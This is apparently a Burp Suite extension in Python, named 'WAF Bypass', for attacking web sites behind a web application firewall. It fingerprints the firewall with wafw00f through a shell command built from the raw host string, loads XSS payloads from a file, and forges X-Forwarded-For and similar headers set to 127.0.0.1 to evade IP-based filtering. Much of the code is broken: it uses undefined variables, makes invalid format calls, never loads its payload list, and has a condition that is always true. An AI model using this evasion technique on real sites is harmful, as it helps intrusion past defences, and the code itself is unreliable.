from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadProcessor
from burp import IIntruderPayloadGenerator
import subprocess
from burp import ISessionHandlingAction
from burp import IParameter
"""
Name:           WAF Bypass
Version:        0.0.1
Date:           08/06/2017
Author:         Guillermo Munoz Mozos - gmunozmozos@deloitte.com
Github:         https://github.com/d3xtr4v4g4nt3/Breaking-the-Wall-of-Web-Parser
Description:   Extension to Bypass WAF plugin.
"""
waf_list = { 0 : "Anquanbao",
    1 : "Juniper WebApp Secure",
    2 : "IBM Web Application Security",
    3 : "Cisco ACE XML Gateway",
    4 : "Better WP Security",
    5 : "F5 BIG-IP APM",
    6 : "360WangZhanBao",
    7 : "ModSecurity (OWASP CRS)",
    8 : "PowerCDN",
    9 : "Safedog",
    10 : "F5 FirePass",
    11 : "DenyALL WAF",
    12 : "Trustwave ModSecurity",
    13 : "CloudFlare",
    14 : "Imperva SecureSphere",
    15 : "Incapsula WAF",
    16 : "Citrix NetScaler",
    17 : "F5 BIG-IP LTM",
    18 : "Art of Defence HyperGuard",
    19 : "Aqtronix WebKnight",
    20 : "Teros WAF",
    21 : "eEye Digital Security SecureIIS",
    22 : "BinarySec",
    23 : "IBM DataPower",
    24 : "Microsoft ISA Server",
    25 : "NetContinuum",
    26 : "NSFocus",
    27 : "ChinaCache-CDN",
    28 : "West263CDN",
    29 : "InfoGuard Airlock",
    30 : "AdNovum nevisProxy",
    31 : "Barracuda Application Firewall",
    32 : "F5 BIG-IP ASM",
    33 : "Profense",
    34 : "Mission Control Application Shield",
    35 : "Microsoft URLScan",
    36 : "Applicure dotDefender",
    37 : "USP Secure Entry Server",
    38 : "F5 Trafficshield"}

def waf_attack(waf_list):
    print "Specific Payloads for detected WAF: ",waf_list


def load_xss_payloads():
    print("Loading Payloads File...")
    PAYLOADS=open("Breaking-The-Great-Wall-Of-Web.txt","r")

class BurpExtender(IBurpExtender, ISessionHandlingAction,IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Bypass WAF by GMM")
        callbacks.registerSessionHandlingAction(self)
        # register ourselves as an Intruder payload generator
        callbacks.registerIntruderPayloadGeneratorFactory(self)

        # register ourselves as an Intruder payload processor
        callbacks.registerIntruderPayloadProcessor(self)
        return

    def getGeneratorName(self):
        return "My custom payloads"
    def createNewInstance(self, attack):
        # return a new IIntruderPayloadGenerator to generate payloads for this attack
        return IntruderPayloadGenerator()
        
        #
        # implement IIntruderPayloadProcessor
        #
    def getProcessorName(self):
        return "Serialized input wrapper"
    
    def processPayload(self, currentPayload, originalPayload, baseValue):
        # decode the base value
        dataParameter = self._helpers.bytesToString(
            self._helpers.base64Decode(self._helpers.urlDecode(baseValue)))
            
        # parse the location of the input string in the decoded data
        start = dataParameter.index("input=") + 6
        if start == -1:
            return currentPayload
                
        prefix = dataParameter[0:start]
        end = dataParameter.index("&", start)
        if end == -1:
            end = len(dataParameter)
                                        
        suffix = dataParameter[end:len(dataParameter)]
                                        
        # rebuild the serialized data with the new payload
        dataParameter = prefix + self._helpers.bytesToString(currentPayload) + suffix
        return self._helpers.stringToBytes(
                self._helpers.urlEncode(self._helpers.base64Encode(dataParameter)))

    def performAction(self, currentRequest, macroItems):
        requestInfo = self._helpers.analyzeRequest(currentRequest)
        headers = requestInfo.getHeaders()
        host = requestInfo.getHost()
        reqBody = currentRequest.getRequest()[requestInfo.getBodyOffset():]
        cmd="wafw00f " + host
        try:
            output = subprocess.check_output(
                                     cmnd, stderr=subprocess.STDOUT, shell=True, timeout=3,
                                     universal_newlines=True)
        except subprocess.CalledProcessError as exc:
            print("Status : wafw00f was unable to execute.", exc.returncode, exc.output)
            print("Loading Payloads from file...")
            load_xss_payloads()
        
        else:
            result=format.output()
            print("Output: \n{}\n".result)
            try:
                waf_name=result.split("is behind a ")[1]
                for i in waf_list:
                    if waf_name == waf_list[i]:
                        print("Trying to include some generic payloads for detected WAF...")
                        waf_attack(waf_list[i])
                        print("Loading Payloads from file...")
                        load_xss_payloads()
                        return
                return
            except:
                generic_headers=raw_input("The WAF has not been detected. Do you want to apply generic rules?(Y/n)")
                if generic_headers == "Y" or "y":
                    # WAF Bypass IP
                    bypassip = '127.0.0.1'
                    
                    # Add WAF Bypass headers
                    headers.add('x-originating-IP: '+bypassip)
                    headers.add('x-forwarded-for: '+bypassip)
                    headers.add('x-remote-IP: '+bypassip)
                    headers.add('x-remote-addr: '+bypassip)
                                        
                    # Build request with bypass headers
                    message = self._helpers.buildHttpMessage(headers, reqBody)
                                            
                    # Update Request with New Header
                    currentRequest.setRequest(message)
                    print("Loading Payloads from file...")
                    load_xss_payloads()
                    return
                else:
                    print("Exiting...Please try to change the target")
                    return

class IntruderPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self._payloadIndex = 0
    
    def hasMorePayloads(self):
        return self._payloadIndex < len(PAYLOADS)
    
    def getNextPayload(self, baseValue):
        payload = PAYLOADS[self._payloadIndex]
        self._payloadIndex = self._payloadIndex + 1
        
        return payload
    
    def reset(self):
        self._payloadIndex = 0

